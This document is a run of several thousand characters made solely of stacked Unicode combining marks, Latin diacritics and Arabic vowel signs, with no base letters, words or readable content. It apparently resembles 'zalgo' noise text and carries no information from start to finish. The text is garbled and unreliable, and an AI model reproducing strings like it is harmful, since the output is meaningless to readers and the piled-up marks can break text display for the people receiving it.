ًًٌٌٍٍََُُِِّّ̧̪̺͇̬̲̬̻ͨͯͯ̊̚͜͢͠͏̵̷̸̴ًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̧̧̨̡̛̩̦̠͖̗̪̞̞͉̲͓̩̱̥̲̘͔̭̫̭̰̮͕̖̫̦͑͗ͤ̎ͭ̎̽̓͛̀ͮ͆̏̉ͣͭ̅́͛ͫ̚͜͞͡͞͠͞͞ͅ͏ً̈́҉̶ًٌٌٍٍََُُِِّّ͉͓͕̪̮̣͋̋̈́ͥ͛̎͑ͯ͢͠͞͏ًًٌٍَُِّ̛̯̳̗̏̂ͬ̄́̆͟͡҉̷̸̷ًًٌٌٍٍََُُُِِّّ̧̺͇̝̠͈̰̒͋̉͂́ͭ̀̀̕̚͝͞͏̶̸̷̵̴ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُِِِِِِِّّّّّّّ̨̨̧̛̛̮̗̱̳̖̙̜̟̰̟̯̲̥͕͍͎͖͖̫͉̪̹̹̳̪̦̩͚̐ͮ͋̌̅ͦ̃̏͑͋̓͗̊͑͗́̍͛̽ͤ̋̏́͐̑̓͌̽ͨͨͭ͘̕̕͢͟͢͡͡͝͡͞ͅ͏̷̴ًًًٌٌٌٍٍَََُُُِِِّّ̡̩̪̮̦͉͓̳͉̲̲̀̈́̍̓̒̽ͮͥ͂ͮ̃͢ͅ҉̸̶̸ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِّّّّّ̢̛̣̱̝̳̘̹̳͖̯̪̳̹́̿̅̒̐͐́͆̄ͩͫͪ͋̿ͣ̕͘͟͟͝͠ͅ͏̸ًٌَُِ̹̠͕͉̔̄́̚͜͏̷ًٍَُّ̺͍̮̃̂ͭ̂͏̵̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̡̛̛͖͕͓͓̟̼̞͇̫͈̜̦ͫͦͤ͒ͪ͂͐ͫ̍ͦ̔ͪ̓͂̆͘̕͞͠͏ًًًٌٌٌٌٍٍٍَََُُُِِِّّّ̨̧̧̻͓̪̖̳͙̟̤͙͇̖͐ͤ̌̎̇͌ͣ͊̈͋̂̄͘͢͜͝͝ͅ͏̷̵ًًًٌٌٍٍٍَََُُُِِِّّّ̢̨̧̡̭̳̹̬̻̮ͯ̐ͫ͂̏́͟͏̴ٌٍَِّ͈͕̏̿ͪ͞҉̵ًٌٍُِ̗͕̈́̚͏̶ًًًًٌٌٌٍٍٍََََُُُُِِِّّّّ̧̨̡̢̡̛͚͎̜̙͈̩̭̰̺͎̦̰̬̤̍̀̈̔̀ͩ͛̾̾̄͛ͤ̍́ͦ̒͛͜͢͟҉̴ًٌٍَِّ͇̹̫̺̐͠͞҉ًٌٍَُُِّ̲̙ͥͯ́͛̚͜͟ͅ҉̷ًًٌٌٌٍٍٍَََُُِِِّّّ̱̱̳͍̝͖̬͚̜̭̈ͣ̔̋̆ͦ̀̄̾̕̚͜͜͡͏ًُ̣̮ͪ҉̵ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̢̨̮̯̰̝͎̟̰̦̣̰̖̺̈͆̐̀̓̾̊̏ͯ͊̎́͋͘͢͡͡҉ًٌٌٍَُِِّ̢̡̜͂̽̕͘͡҉̵̶̸̷̵̵̶̸̴ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّّ̡̨̨̧̨̛̜̯̘̠̬͍̰̤̥͚̞̣͚̠̬̹͈̬͉̹̙̙͈͔͉̤̘̫̫̙̳ͬ̔ͫ̑͆ͩ̍̏͒̍͌́̆̒̔̊̑̔ͭ̀̋ͭ̅̏ͦ̑̽ͯͭ͗ͦ̀͒͋͆̕̚̕͜͟͢͡͝͡͞ͅ҉̷̴ًًًٌٌٌٍٍٍَََُُُِِِّّّ̥͙͙͚͚̮̺̘̙̦̼͎́̅͒͋̑̀̓̔̏̊͘̕̚͜͢͡҉̶̷̶̵̷̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̧̨͖̩̪̮̙͉͎͍̬͙̤̣̫̦̪ͮ͗̈́́ͧ͒́͆ͬ̍ͬ̀̓̐ͬ́ͣ͒̓ͮͦ̈́͒͒͘͘͜͜͜͜͢͡͡҉̷̶̸̴̵̵̶̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِِّّّّّّّّ̢̡̛̣̠͍̗̬̹̤̭̱̩̫̮̫͚̰͓͍̩̺̗̥̞̻̳̼̹̀̋̉̿͋̋͂͊̉ͧ̈́̌̇̎̉̀ͮ͊ͩͩ̈͆̾̽̿̉͊̽̑ͬ̕̕̕̚͜͟͟͜͟͠͞͡ͅ҉ًٍَّͨͅ͏̴̶ٌٍُِّ̢̠̪͚ͧͪ͟҉̵̵ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّ̢͈̣̖͍̗͙̹̳̣͈̭̖͖̒͗͒ͤ̈̔̉ͩ̿̔ͯ̓̚͘̚͢͜͟͢͠͞҉̵ًٌٍٍَُِِّّ̢̢͉͇̖͚̱̮̯͑̌ͤ̄ͨ́͏ًٌٍَُِّ͉̩͍̺̐̂̊ͤ͢͡҉̵̷̶̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̧̡̢̛͔͖̟̣͍̗̜̺̬̺̙͈̫̳͔̻͖̣̰̊̀͑̀̑̓̀̏̂̔̽ͩ̀ͭ͗ͭ̃̽͘͘̕͢͜͠͠͝͡ͅͅͅ͏̶̴ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̢̢̛̫͚͎͍̱͕͎͈̅̏̀̏͋̄̋͂͘͢͝҉̶̸̷̵̵ًًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̡̡̝̞̲̜̫͇̼͇̱̜̳̰͕̊̊͗̐ͬ̀̋ͪ̏̓͛͆͑ͮ̓͂̌̚͘̕͢͢͢͡͡҉ًٌٍَُِِّ̢̛̗̯͖̣͌̔ͬ̆͟͡͞҉ًٌٍٍَُِّ͎̲͉̝̦̯͐͂̇͒̓͘͜͡͝͏̶̸̴̴̷̶̸ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّّ̢̨̛͔̫̙͉̙̩̬̝̣̙̙͔̥̬̦ͤ̍͒̃̅̔̌ͮ̏ͬͯͪ͗̓͊͂͘̕̕̕͢͜͟͞͡͠͝ͅ҉̶̶̷̸ًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̡̧̨̜͔̫̖̜̰͙̥̝̟̯̰̯͖͕̰̝̙ͬ͒ͥ͋̏̍͆͐̌̚̕̚͘̕̕͢͜͞҉̸̵ًًًٌٌٍٍََُُِِّّ̧̛͎̣͙͙͚͙͖̓̃͋͑̆̕͜͞͠҉̴̵ًًٌٌٌٍٍٍََُُُِِِّّّ̡̧̹̤̖̪̪̯̳̺͈̮̰ͨͭͩ̍͌͗͂͛̀̀͝ͅ͏ًَ͓ͣ͊͏̸̴̵̷ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̨̢̪̹͓͍̱̟̹͙̦̳̖̪̆ͣ̎̓̽͌ͪ͒̌ͪ́̿̀̀̉̍̀̐̆͐̕͘͜͟͢͞͠͞ͅ͏ًٌٌٍٍَُِِّّ̧̨̱̥̻̺̲̲̈́͑͌͐̉͜҉ًٌَُ̛͉̪ͫ͠҉̸̶̵̵̸ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̢̧̨̢̡̻̜̯̮̞̫͍̥̣͖̱̲͙ͦ̇͗́̑ͨ͆ͭͨ͐ͬ͌ͯͫͦ̚̕͞͡ͅ͏ٌٍُِّ̛̯͍̞̭ͩ͊҉̵ًًًٌٌٍٍَََُُِِّّ̨̛̹̟̞̺͙̟ͬ̈̀ͣ̎͊̈͟͜͟͝͞͏̷ًٌٌٍٍَُُِِّّ̨͕̗̣͈͌ͣ̓̀͑̿͌̕͠҉̷̷̴̸̸̸̸̷̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِّّّّّّّ̡̢̢̧̛̱͚̹͖̩͚̳̪̮̯͚̣̪̳̠̭̮͉̤̬̤̞͈̯͇̖͆ͥ̎͋̂̎̇͋̋̽ͥ̅̒͂̎̈́ͪ̏̆ͤ̾́͆̄ͪ́̚͘̕͜͟͠͞͏̸̶ًًٌٍَُِّ̣̼͚͚̖̲̜ͧ̾͘͟͡͝҉̵̴̸̴ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̧̢̢̧̨͔͎̹͎̮̬̹͚̞̣̼̘̪̘̬̻̯̼̅̆ͤ̒͋̄̍̌̊̂ͣ̒̌͊̔̇͌ͧͤ̑̕͢͟͟͡͡͠͞͝͏ٌُِ̢̜͋͘͏ٍّ̤̦͟҉ًًٌٌٍٍََُُِِّ̡̧̭̖͓͍̖̥̣̭ͮ̀̀̅͘̕͏̷̴̷ًًًٌٌٍٍَََُُِِّّّ̧͚͓͓͙̼̝̹̳͈̓̽ͥ̔ͥ͌͒ͩ̾͘̕͜҉ُ̰҉̶̴̴̸ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̡̧̡̢̨̡̨̛̛̪̩̖̳̥̦̮̝͓̞̮̖͍̟̲͙͇̞̠͖͈̫̳̋̋̀͗ͥ̂́̅̆̋́̆ͭ̿̐ͦ̔͂͋̄̄́ͪ̀̃͐ͫ̿̀̓͘̚͟͞͞͡͠͞͠͡ͅͅ҉̷ًٌٍٍَُِِّ̢̡̥͉̠͚̪̃͂̇̃͊̋̑͏̴ًًًٌٌٌٍٍٍَََُُُِِِّّّّ̧̢̨̡̨̛̜̬͔̯̹̬̟̼̱͂͊ͪ̀ͮ̏͘͘͝͝͞͏̴̸ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̨̧̛̜̳̖͖̬̫̼̣͉͎͉̭̤̹̝̏͌̔͒́̐́̍̈ͫͮͨͧͩͩͯ̐̕͜͜͟͡͠͝͞͡҉̴ًًٌٍٍََُِِّّ̛̛̱̝͎͉̬̬͉͎̮̎ͥ̀̋̋ͣ̒̌̕͘͟҉̷̶ًٌٌٍَُُِّ̡̣̜̤̳̓̎͗̌̀̚̕͞҉̶̵ًًًٌٌٍٍٍَََُُِِِّّّ̡̧̟͓͍̳̭̭̬̬̲̟͓̽͋́ͬ͆̍ͪ͆͋̄́͑̅ͫ͘҉̸̷ًٌٌٍٍَُُِِّّ͔̲̦͇̜̇ͦ̅͋̀̍ͬͣ͜͟͢͞͏̷̴̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̧̫̰̹͔̯̻̪͔̞̻̣̳̆̍̄̏ͯ̾̉̍́̊̆̃̕͜͢͡ͅ҉̴̶̴̸̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّ̢̡̢̡͍̖̞̠̬͔͔̠̠̩̝̤͇̙̳ͭͫͥ̀̈́̿͛͑̒́ͫͫ̈́ͮ̓̅̇̔̕͘͢͞͝͠͝͞͝͡͝͡͡ͅ҉̷̶ًٌَُِّ͓̣̪̑ͧ͂͛͏̷̵̸ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̧̛̛̳͉̹̟̱̼͔̟̹̟̫̫͈͙̭ͬ̑̍͛̈́́̋̈ͫ̔̌̓̀̊̃̎̑͗ͦ͘͜͞͡͏ًًٌٌٍَُُِّ̢̛̛̟̫̲̫͖̺̅̐ͅ͏ٍَِّ̧̫̀̀̽͏̷̷̵̴̴̷̸ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̨̧̡̧̧̡̛̺̯̼̝̻̱̰̞̜͈̥̩̣̱͍̟͉̪̫̥̝̼͚̼͉̺̖̬̼̟̞͔͔̰͒̀̔͌ͩ͒̐̄ͨ̔̀̀͗ͨ̓ͫ̓͑ͪ̀́͛͐ͦ̎̔ͭ̌͌̉̀͐́̈ͭ̕̚̕̕̚͘͢͟͢͢͞͠͡͠͞͡͡͠͡ͅ͏̵̵̵̸̵̷̸̵̸̸̷̶̴̸̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̧̧̢̧̢̡̨̡̡̧̛̪̦͙̦͓̟̺̹̝͔̘̹͕͉̯̺̞͇̜̞̖͈̮̩̥̙͍̠̟̬̫̫̟͇̥ͯ̄͋͛ͭͫ͌͒ͨͤ̓̂̋̇̿̌ͭͧ̐́̑̎͌ͨ͌̽ͨ̽̒͛̒̀͂̆͘͘̚͘͘̕͢͠͠͞͡͠͠҉̶̶̸̷ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̨̡̧̢̛̼̭͚̞̩͇̩̤͇̗̣̮͕̟̭̙̦̤͂̀ͦ̽͂́͆̆͐ͩ̃́̂̾͒̃͊͘̕͟͢͠͝͞͠҉̵ًًًٌٌٌٍٍٍَََُُُِِّّّ̧̨̛͇͉̠͉͈̙̼̙͂̾̌̆̈͘͠͞͞͝҉ٍِ͈ͧ҉̸̸̷̴̷ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّّ̛̳̲͍͓̮̝̣̺͇͍͍͓̗͂͌͑ͪͮ̓̔̇̆̏̚̕̕͢͡͞͠͏ًًٌٍٍََُُِِّّ̢͚̤͔̳̙̲̹ͤ̆ͣ́̉̾͢͢҉̴ًٌٍَِّ̱͇̭̓͝͏̴̸̶̶̶̵̶̵ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̨̧̨̛̛͓͈̺̞̳̺͎̤̤̞̪͈͙̪̖̙̹͕͚̫̙̮̩̮̯̻̮̼̙̞̺͙̐̍͆ͥ͆͆̂͐͆̅ͤͫ̿͐̂ͬ͐̍͌̓͊̾̒̇̀ͫ̀ͣ̏͘͘͘̕̚͟͟͠͡͠͝͞͞ͅͅ͏̷̷ًًًٌٌٌٍٍٍََُُُِِِّّ̧̧̢͈͚͚̪̬̞̬͕͖̋̽ͮͯ̓͛̌ͤ̄ͥ́ͧͥ͟͠͠͏̴̸ًٌٍََُِّّ̨͔̹̘͒̀͂̽͜ͅ҉ًٌُ̤ͧ҉̵̷̵̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̛̳̦̥̙̼̳͚̪̩̯̮̐̔́͊̅ͤͪ̊̄͆̚͘͠͠͠͝͝͏̶̸̶̸̸̵ًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̡̧̤͉̹͎̠̳͔̰̘̘̞̤̪̝ͭ̓ͦ̉ͩ̾̇̑͆ͧͪ́̍ͥ̏̎ͮ͂̕͢͢͡͠͞͏ًًٌٍَُُِّ̨̡̧̣͓̝̣̙̑̄̎̍ͣ̆̐ͧ͠͏ًٌٌٍٍَُِِّ͇̟̖ͮ͒̍͋͟͜͢͞͏̸̵̷̴ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̡̨̧̡͇̖̦̬̤̳̭̣͓͖̱͇̅̆̈́ͥͨ̈ͧ̃̈́ͬ͌̊̉̔́͆ͮͬ̐̔̅̕̕͟͢͜͡͠͝͞͝͝͞͞͏̶ٌٍَُِّ̨̰͈͓̖̭̾ͬͥ̓͝҉ًُ̹̹̀͞͏ٌٍِ̧̹̫ͯ͝҉̶̴ًًًٌٌٌٍٍٍَََُُُِِِّّّّ̡̢̡̛̤̻̳͍̯͓̮̣̬̒̋͆͗̌̌ͧ̊̂͗̑̈́̏ͦ̕̚͟͜͡͞͏̴ًَ͏ٌُ̯ͩ͜͏̴̶̶̴ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̧̡̡̛̗̜͚͈̖͍̟͚̝͖͕̣̳̲͙͖͋ͪͥͦ̄ͬ͆ͦͪͯ̂̋̓̀͘͜͟͠҉̶̶̶̸̴̶̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِّّّّّّّّ̢̧̮̞͍͓̳͔̜̥̜̪̩̯̼̣̭̻̼̤͚̹̙͔̗͚̱͉̦̤̻̒͊̀͆̄́́ͨͭͧ̉ͧ̋̓́ͥ̔ͮͣ̿̌̐͋ͩ̌́ͯ̑ͯ͘̕͘͜͟͝͞͡͝͠͞͝ͅ͏ًٌٌٍَُِِّ̥̳̥͎ͨͮ́ͮ̌͐̅͑̕ͅ҉̸ًٍَّ͎̬̿̓ͭ̕̚͝͏̵̶̷ًًٌٌٍٍََُُُِِّّ̦̝̼̝̪͙̟̦̭͉̌ͩ͗̌̈́̍̃͂̌̎̕̕̕͜͜ͅ͏̶̴̸̴̴̸̵̶̶̷̶̵ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̧̡̡̡̛̮̳͍̮͓̟̟̺̰̲̮͕̯͓̰̬͔̜͚̲͙̜ͮ̅ͯ͆̒̍ͨͦ͗̐̂̏ͥ̉ͯ͛̆̉͋̈́ͧ̌͂̓ͮ̎̄̒̽ͧͦ́ͮͧͭ͘̚͘͘̚̕͢͞͞͞͡͠͝͞҉̴̷̷̴̵̷̴̶̷̴̸̴̸ًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّ̢̧̡̢̨̛̛̛̛̖̠̰̬̞̯͖̦͈͙̰̰͚̠̬̫̮̠̙̤̳͖͚̰̳͚̱̙̯̠̖͈̩͎͇̬̹̟̰̩͔̲͍̮̬̱̟̣̻͚ͯ̂ͮ͋̒̔͒̔́̐̑̋̈̃̾̀̂́̓́̓͂ͦ̃̌̂ͮ̏̈̽̈́̓͌̾͆̐͌ͤ͌̓̌͂́̿ͫ́̿̈́͌͘̕̕̕̕̚͘͘̚͢͢͜͡͡͠͠͝͠͠͝͞͞͡͞͏̴̴̶̵̶̵̷̵ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّّ̡̢̨̨̡̢͔̲̙͎̠͖͍̰̟̼̺̥̰̻̜̲̣͕͍̜̳̭̮̼̰͓͚̪͕̲̗̰̰̗͚ͣ͑̇̏́̎̽ͭ̓̎ͯͣ̆̈́̂ͦ͂́͑̆͂̀ͨ́ͦ̒́̓̀ͪ͐͛̿̿͂ͬ̌́̇̓ͬͧ̅͂̚̕̕͘͟͢͜͢͟͞͞͠͡͞͡͞͡͠͡ͅͅ͏ًͤ͏̴̸̸ًًٌٌٌٍٍٍََُُُِِِّّّ̢̧̛̤͉̣͚̥̗͍̦̰ͬ̇ͩ̑̔͊̇̀ͨ̕͘͜͜͠͏̷ًًٌٌٍََُُِِّ̲̥͇͓͇̤͑ͤ͐̉ͧͬ̕͜͡͡҉̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِّّّّ̨̨̛̙̖͉̫̫̯̬̼̙̽ͩ̓͗̀̇ͫ̓̏͊́͋̇́̔̉̆͘͘͢͜͞͞͞͞͠ͅ҉̸̸̵̷̴ًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̮̼͔̖͚̦̻͖͖͚̥͉̫͓̗͛̅̈ͮͤͯͮ̈̔͘̕͢͟͠͠ͅ҉ًًًٌٌٌٍٍََُُُِِِّّ̧̛̝͔͓̟̗̗͗̌̆̓ͧ͑̐̂͗̕̕̕͟͢͝͏ٍَّ̙̌͏̴̴̵̴̷̴ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̨̨̨̡̛͈̝͔̟̫̣͎̗̫̰̮̳͍̞͍̗̩̥͇̠̾ͩͧ̑ͨ̅ͣ̓̓ͧ̓ͮ́̑͌̌́ͧ̓ͬ͘͘͜͢͢͠ͅ͏̴ًٌٍَُُِّ̪̮̮͙̫ͩ̔ͭͦ́͞͏̶̶̸̶̴̵ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِِّّّّّّّ̧̢̡̢̢̨̡̢̨̛̟͕̘̮̮̭̳͖͚̪̘̼̹̣͕͇̝̪͙̙̝̞̪ͫ̇́ͫ̿ͤ͛͗ͨ̆̃ͭ̍́̀ͤͯ̿ͦ̿̈̿͆́͘͘̚͘͘͜͢͜͠͡ͅͅ͏̸̶̶ًًٌٌٍٍٍَََُُِِّّّ̨̱̤̳̎̍͒ͣͭ̔ͯ̽̊͒́̇͝͞͞͡ͅͅ҉ً҉̵̷̴̴̷̵̷̶̸̷̷̶̷̶̴̶ًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّ̨̧̢̧̨̢̨̢̢̨̨̨̡̢̛̹̝̻͉͙̲͉̥͔̝͖͎̣͔̳̰̖̲̻̹͖̞̱͓̰̥̠̰̗̳̪̦͇̦͕̝̺̝̺̥͔̱͎̣͍̝̻̥̲̞͚̫̠͐̉̊ͩͥ͊́̅ͤ̀ͣ̊̑ͫ̐̇̒́͒̎͗̿̀͆̔ͫ͋ͮ̿͛͆̾͊̏ͤ͆̂̀̾ͯͨ͋͑͑̂ͩ̍ͨ̑̽ͨ̀ͥ̈́͘͘͘͢͜͜͟͢͢͟͢͝͝͠͠͞͞ͅ͏ًٌُ̢͎̂͏̴̴̴̵̷̷̶̸̶ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّ̢̧̧̢̨̧̨̨̨̡̛̛̟͎̥͈͓̻̲̜̩͈͙̯̤̥̖̳̫̗̗͓͔̮̦͙̹̥͍̱̮͖̫̞̘̜̠͎̲͎̯̬͇͔̍͌͆̃̀ͨ̍ͨ͐͗ͣ̽ͩͣͭ̇̀̓͋́̇ͬ̎̋ͪ͊̎́́̓͐̑́̐͒̋́̑ͧ̕͘͘͘̕͢͟͡͞͠͏ًٌٍَُِّ̤̖͋͑̕͢͝͏ًَُّ̙̇́͢͢͏ٌٍَِّ̢̜̜̈́͌͘͝҉̵̵ًًٌٌٍٍَُُِِّ͔̤̻̝̻̭͈̪̪̠ͨͬ̾̀̂ͧ̒͒̃͞͠͏̵̷ًًًٌٌٌٍٍٍََََُُُِِِّّّّ̡̨̲͎̭̝͇̮̪̥̻̯̺͒̏ͬ́ͨ̀̉̾̀ͯ̕̕̚͟͟͜͠͞͠͞ͅ҉̴̵ًًٌٌٍَُُِِّ̨̲͕̘̙͖͊̀̒̚͞҉̸̷ًًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̢̛̻̤͇̯̭͉̫̜̜͓̰̮̱͎͑ͬ̑͌͋ͫ͌͗ͨ̀ͫ̿̇̅͘͜͜͜͜͏̴̴̸̸̷̵̸̸ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُُِِِِِِّّّّّّ̡̢̛̩͇̻̩̤̥̝̩͚̟̦̝͓͕̼̜̠͛̉ͯͣ̀̋ͭͬ͛̓͆ͩ́̈͑̉̎̒̀̽͊ͭͩ́̕͘͝͞͝͞͡҉̷̶̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̛̮̟̤̦̰͎̟͍̮͔̠̫̘̗̿̐́̄ͮ̊ͥ̋͋ͬͬͣ̿͌̊̕̕͢͢͠͝͠҉̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِّّّّ̡̢̧̢̪̤̙͎͍̦̥̖̱̥̣ͪ̐ͤ͒̇͗͊͑ͨͧ̅̕̚̕͜͞͠͝͏ٍِّ̛̟ͩ͏ًًٌٍََُُِّ̧͉͈̳̖̟̠̥ͬ̄́̈́͛̀͌͘͏̵̷̶̷̴̵ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̨̧̧̢̨̡̧̛̖͔̺͚̫̠̪͎̼͚̯̬̤̺̤̻̞̦͈̬̜̞̻̬̪͕̲̙̘͔̳̲̟ͦ͌ͯ́́͌ͣ̑ͨͦ̇ͤͧ͗̆͗ͯͮͪͮ̄͗̏̃ͭ̍ͣ͗̾͂͋ͩ̕̚̕̕̕͘͟͜͢͝͝͡͞ͅ҉̶ًٌٌٍٍَُِِّّ̧̻̜̗̙͍̗͊̏̉͒̄͌͞͝͏̶̷ًًٌٍََُِّ̙̳̳̅́ͩͮ̎͡͝҉̵̶̸̷̴̴̶ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̧̨̢̧̛͍̘͕͓̰͈̦̝̞̻̗̦̝͔̩͇̺͕̃ͮ́̈́̋̾͊̊͒́̀̏̈́̊̍̿̿͛͒͜͜͟͢͡͡҉̵̴ًًًٌٌٌٍٍَََُُُِِِّّّ̧̧̛̯̺͇͙͇̳͖̯̭̲͓ͥ̀̓ͮ̓͂̑ͥ͐ͩ̑͠͠҉̸̶̴ًًًًًٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِّّّّّ̡̧̧̧̛̲̙͓̝͚̫̗̩̞̪̱̜̱̜̟̯͓͂ͫ͊̐̅̎̂̂̾̉̾ͣ̑͛̐̽ͣͦ̀͘̕͘̕̕͜͢͠҉̷ًًٌٌٍٍََُُِِّّ̡̧̛̎̒ͮ̆ͥ̚͞͞͏̷̴̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̧̧̧̨̨̢͈͓̖̥̣͚̹͙̝̠͎̭͈͕͙̟̻̼̳͕̖̤̙̲̈́̒͗͗̈́͒͆̍̃́̀̉͂̊́̈́̃ͩ̀̈́ͦ͘̕̕͜͢͞͝͞͏̸̷̴ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̧̢̨͚͚͖͙͚̗̖̞̘͉̮͎̯̱̙͖̇̒ͯ́ͦ́̽͐͑̔̽̓ͥ̒͒̄ͪ̌̕̚͘͢͜͢͞͝͠͞͝ͅ҉̴̶̷̵ًًًٌٌٌٍٍٍَََُُُِِّّّ̢̡̤̼̦̙̳̭̱̹̙̿̀̀̃̆ͪͦͬ̑͒͟͝҉̸ًًٌٌٍٍٍََُُِِِّّ̧̨̧̛̛̦̙̭̠̱̹̯̻̔̃͑͑ͫ̔ͨ̇͟͢͞҉̵ًًٌٌٍٍََُُِِّّ̜͓̥̱͎̳ͪ́́̀ͩ̀ͫ́̽͟҉̵̵̶̸̷̷ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّّ̢̢̧̢̛̙̲͓̘̯̠̬̤̯̠̭̳̪̹͔͈̩̹̮̙͇̇ͤ̋̋ͥ̋͛ͤ̒̀̉̽ͭ͌̋ͯ̄ͭ͋͢͢͜͢͞͞͠҉̸̶̵̷ًًًٌٌٌٍٍٍَََُُِِِّّّ̡̛̛̼̦̳̞͎͐̂̈͊̃ͣ̎͜͢͞͠͏̴ٌُ̻̑҉̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّّ̨̡̣̭͙̝͔͍̭͎͇͎͓͓̫̯̤̘͈̯̹̥̱͛̓̐̀̓ͣ̐̈́̂̇͆̒ͩͥ̉͌̃̒͑̀̒̊̆͂̕͘͘͢͟͜͜͜͡͠͞͞͠͡͝҉ًًٌٌٍٍََُُِِّّ̧͖̱͍̙̥͍͕̠̺͎̤̒̆ͥͫ̀̒͛ͪ͂́̏̌͟ͅ҉̷ًٌٍَُِّ̧̗̻̺̰̻͂̈̂̔͢͝҉̵ًًٌٍََُِّ̨͖̬̻̱̊̀̀͟͡҉̸̸̵̸̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̡̢̛̠̙͎̩̗̪̦͎̠̦̟͕̘̲͍̪͇͈͇̾̋͗̂͆̽́̃̃̈ͥ́ͩ̑̌̈ͧͨ́̋̕̕͘͘͘͜͢͞͠͏̸ًٌٍَُِِّ̢̛̬͎̠̈̀ͭ͐͠͏̸̶ًٌٍٍَُِّّ̱̱̩̣̼͓̦̐̆ͣ̕͟͝͏ًَُ̺̗ͬ͏̴̸̸̴̴̷ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̢̧̧̡̛̜̝̤̻͔͎͔̖͕̗̠̤͓͓͈̱̣͓̝̩͎̫̺̰̘̣̄̐ͨ͌̃̇͆̎ͭ̽͌ͤ͗̃̒ͫ̏̒̂͌͋̏́̓̚̕͘͢͢͜͢͟͡͞͝͞͞